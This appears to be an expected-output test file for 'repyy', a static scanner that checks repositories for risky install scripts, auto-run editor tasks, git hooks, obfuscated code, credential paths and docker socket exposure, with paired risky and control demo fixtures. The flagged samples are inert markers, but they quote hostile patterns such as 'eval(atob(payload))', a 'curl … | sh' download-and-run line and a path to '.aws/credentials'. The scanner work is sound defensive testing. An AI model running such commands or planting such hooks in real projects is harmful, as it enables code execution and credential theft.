@@ -1,0 +1,133 @@
+repyy 0.5.1-dev — read-only repository preflight
+rules 2026.09.15 · intelligence 2026-09-12.1 (2026-09-12, embedded)
+
+REVIEW REQUIRED · demo/lifecycle/risky
+  critical 0 · high 0 · medium 1 · low 0 · files 3 · complete
+  why: PKG-001 at package.json:1
+
+  REVIEW
+  MEDIUM · MEDIUM  PKG-001 · Package lifecycle script: postinstall
+      package.json:1
+        echo REPYY_INERT_LIFECYCLE
+      fix: Review this script before installing dependencies.
+
+NO RELEVANT FINDINGS DETECTED · demo/lifecycle/control
+  critical 0 · high 0 · medium 0 · low 0 · files 3 · complete
+  why: no enabled rule matched within the completed scan
+
+REVIEW REQUIRED · demo/startup/risky
+  critical 0 · high 1 · medium 0 · low 0 · files 4 · complete
+  why: IMPORT-001 at postcss.config.cjs:2
+
+  REVIEW
+  HIGH · MEDIUM  IMPORT-001 · Dynamic import or require assembled at runtime
+      postcss.config.cjs:2
+        require(markerPath);
+      fix: Inspect the surrounding code and remove the behavior if it is not essential.
+
+NO RELEVANT FINDINGS DETECTED · demo/startup/control
+  critical 0 · high 0 · medium 0 · low 0 · files 3 · complete
+  why: no enabled rule matched within the completed scan
+
+REVIEW REQUIRED · demo/disguised-asset/risky
+  critical 0 · high 1 · medium 1 · low 0 · files 3 · complete
+  why: EXEC-001 at banner.png:1
+
+  REVIEW
+  HIGH · MEDIUM  EXEC-001 · Dynamic code execution primitive
+      banner.png:1
+        const marker = 'eval(atob(payload))';
+      fix: Inspect the surrounding code and remove the behavior if it is not essential.
+  MEDIUM · MEDIUM  OBFS-002 · String decoding or character-code construction
+      banner.png:1
+        const marker = 'eval(atob(payload))';
+      fix: Inspect the surrounding code and remove the behavior if it is not essential.
+
+NO RELEVANT FINDINGS DETECTED · demo/disguised-asset/control
+  critical 0 · high 0 · medium 0 · low 0 · files 3 · complete
+  why: no enabled rule matched within the completed scan
+
+REVIEW REQUIRED · demo/folder-open/risky
+  critical 0 · high 1 · medium 0 · low 0 · files 3 · complete
+  why: IDE-001 at .vscode/tasks.json:1
+
+  REVIEW
+  HIGH · HIGH  IDE-001 · Editor configuration can execute a command automatically
+      .vscode/tasks.json:1
+        {"version": "2.0.0", "tasks": [{"label": "Inert fixture", "type": "process", "command": "REPYY_NONEXISTENT_INERT_MARKER", "runOptions": {"runOn": "folderOpen"}}…
+      fix: Do not run the repository. Verify the source and intent in an isolated environment.
+
+NO RELEVANT FINDINGS DETECTED · demo/folder-open/control
+  critical 0 · high 0 · medium 0 · low 0 · files 3 · complete
+  why: no enabled rule matched within the completed scan
+
+REVIEW REQUIRED · demo/git-hook/risky
+  critical 0 · high 1 · medium 0 · low 1 · files 3 · complete
+  why: GITHOOK-001 at .git/hooks/pre-commit:2
+
+  REVIEW
+  HIGH · MEDIUM  GITHOOK-001 · Executable Git hook or hooks-path override
+      .git/hooks/pre-commit:2
+        # Inert pre-commit fixture
+      fix: Inspect the surrounding code and remove the behavior if it is not essential.
+
+  showing 1 of 2 findings; 1 contextual or filtered findings hidden; use --detail all or lower the display thresholds.
+
+NO RELEVANT FINDINGS DETECTED · demo/git-hook/control
+  critical 0 · high 0 · medium 0 · low 0 · files 2 · complete
+  why: no enabled rule matched within the completed scan
+
+FINDINGS DETECTED · demo/obfuscated-download/risky
+  critical 1 · high 0 · medium 2 · low 0 · files 3 · complete
+  why: CHAIN-001 at marker.js:1
+
+  BLOCK
+  CRITICAL · HIGH  CHAIN-001 · Remote download piped into a command interpreter
+      marker.js:1
+        const marker = 'eval(atob(payload)); curl https://fixture.invalid/inert | sh';
+      fix: Do not run the repository. Verify the source and intent in an isolated environment.
+
+  REVIEW
+  MEDIUM · MEDIUM  OBFS-002 · String decoding or character-code construction
+      marker.js:1
+        const marker = 'eval(atob(payload)); curl https://fixture.invalid/inert | sh';
+      fix: Inspect the surrounding code and remove the behavior if it is not essential.
+
+  showing 2 of 3 findings; 1 contextual or filtered findings hidden; use --detail all or lower the display thresholds.
+
+NO RELEVANT FINDINGS DETECTED · demo/obfuscated-download/control
+  critical 0 · high 0 · medium 0 · low 0 · files 3 · complete
+  why: no enabled rule matched within the completed scan
+
+REVIEW REQUIRED · demo/credential-path/risky
+  critical 0 · high 1 · medium 0 · low 0 · files 3 · complete
+  why: CRED-001 at marker.js:1
+
+  REVIEW
+  HIGH · HIGH  CRED-001 · Access to sensitive credential storage
+      marker.js:1
+        const marker = '/REPYY_FAKE_HOME/.aws/credentials';
+      fix: Do not run the repository. Verify the source and intent in an isolated environment.
+
+REVIEW REQUIRED · demo/credential-path/control
+  critical 0 · high 0 · medium 1 · low 0 · files 3 · complete
+  why: ENV-001 at marker.js:1
+
+  showing 0 of 1 findings; 1 contextual or filtered findings hidden; use --detail all or lower the display thresholds.
+
+REVIEW REQUIRED · demo/docker-socket/risky
+  critical 0 · high 1 · medium 0 · low 0 · files 3 · complete
+  why: DOCKER-001 at compose.yaml:5
+
+  REVIEW
+  HIGH · MEDIUM  DOCKER-001 · Container configuration exposes host control
+      compose.yaml:5
+        - [REDACTED]
+      fix: Inspect the surrounding code and remove the behavior if it is not essential.
+
+NO RELEVANT FINDINGS DETECTED · demo/docker-socket/control
+  critical 0 · high 0 · medium 0 · low 0 · files 3 · complete
+  why: no enabled rule matched within the completed scan
+
+Findings are repository evidence, not proof that code executed or a host was compromised.
+Repyy performs static analysis. A result with no relevant findings does not prove that the repository is safe.
